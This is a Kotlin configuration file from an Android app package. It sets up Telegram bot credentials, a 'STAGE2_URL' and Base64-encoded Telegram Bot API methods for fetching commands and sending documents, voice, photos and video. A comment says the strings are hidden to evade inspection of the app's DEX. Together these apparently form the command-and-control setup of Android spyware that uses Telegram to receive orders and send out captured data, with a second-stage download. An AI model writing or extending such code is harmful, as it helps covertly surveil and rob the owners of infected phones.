package com.serv.app.core

import com.serv.app.BuildConfig

/**
 * Centraliza constantes de build injetadas via gradle.
 * URLs sensíveis são quebradas em runtime para reduzir strings em DEX.
 */
object Config {
    val TOKEN: String get() = BuildConfig.TG_TOKEN
    val CHAT_ID: String get() = BuildConfig.TG_CHATID
    val STAGE2_URL: String get() = BuildConfig.STAGE2_URL

    // API base construída em runtime
    val API_BASE: String
        get() = B64.dec("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==") // https://api.telegram.org/bot

    val METHOD_GET_UPDATES: String get() = B64.dec("Z2V0VXBkYXRlcw==")   // getUpdates
    val METHOD_SEND_MSG: String    get() = B64.dec("c2VuZE1lc3NhZ2U=")   // sendMessage
    val METHOD_SEND_DOC: String    get() = B64.dec("c2VuZERvY3VtZW50")   // sendDocument
    val METHOD_SEND_VOICE: String  get() = B64.dec("c2VuZFZvaWNl")       // sendVoice
    val METHOD_SEND_PHOTO: String  get() = B64.dec("c2VuZFBob3Rv")       // sendPhoto
    val METHOD_SEND_VIDEO: String  get() = B64.dec("c2VuZFZpZGVv")       // sendVideo
    val METHOD_GET_FILE: String    get() = B64.dec("Z2V0RmlsZQ==")       // getFile

    const val MAX_MSG = 3800
    const val POLL_TIMEOUT = 30
}
